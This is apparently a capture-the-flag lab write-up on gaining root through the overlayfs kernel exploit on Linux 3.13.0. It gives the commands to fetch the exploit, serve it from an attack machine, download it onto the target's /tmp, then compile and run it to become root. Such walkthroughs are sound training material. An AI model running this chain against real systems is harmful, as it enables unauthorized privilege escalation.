# Kernel Exploits

First ssh login to target machine

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Since we already know this is a kernel priviledge escaltion, let's see what kernel version is running on our target machine with `uname -a`.

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Now that we have the kernel version lets search in some well know exploits databases, like [https://www.exploit-db.com/](https://www.exploit-db.com/)

Searching for 3.13.0 we have the following results

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

For this lab I manage to get working with the [Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation](https://www.exploit-db.com/exploits/37292)&#x20;

When we open this exploit, we can see the details and the some instructions about this exploit:

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

In order to make this work we have to download the raw content to the attack machine and then pass it to the vulnerable machine.

Choose a directory of your preference and use the `wget` command to download the exploit. For example:

```bash
wget https://www.exploit-db.com/raw/37292
```

Then we rename the file to ofs.c, and we start a HTTP server to transfer the file to the vulnerable machine:

```bash
python -m SimpleHTTPServer 8000
```

Now, in order to use `wget` on the vulnerable machine we must choose the `/tmp` directory, otherswise we will get the "Permission denied" message.

```bash
wget -O /tmp/ofs.c http://<attack_machine_IP>:8000/ofs.c
```

#### Breakdown of the Command

* **`wget`**: This is the command-line utility used for downloading files from the web.
* **`-O /tmp/ofs.c`**: The `-O` option specifies the output file name and path. In this case, it tells `wget` to save the downloaded file as `ofs.c` in the `/tmp` directory. The `/tmp` directory is often used for temporary files and is typically writable by all users.
* **`http://<attack_machine_IP>:8000/ofs.c`**: This is the URL from which you are downloading the file. It points to the file `ofs.c` being served by an HTTP server running on the machine with the IP address `10.10.242.118` on port `8000`.

Now we simply move to the /tmp directory and follow the same instructions presented in the exploit. We compile the file and then we run it:

```bash
gcc ofs.c -o ofs
./ofs
```

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

As we can see, the second time we run the `id` command we see ourselves as 'root'. We can also type the `whoami` command and get similar information.\


<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Now, for the flag we have to navigate to the /home/matt and we can use `cat` to see the content of the file. If we tried to use `cat flag1.txt` before the exploit, we'd get a "Permission denied" message.

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

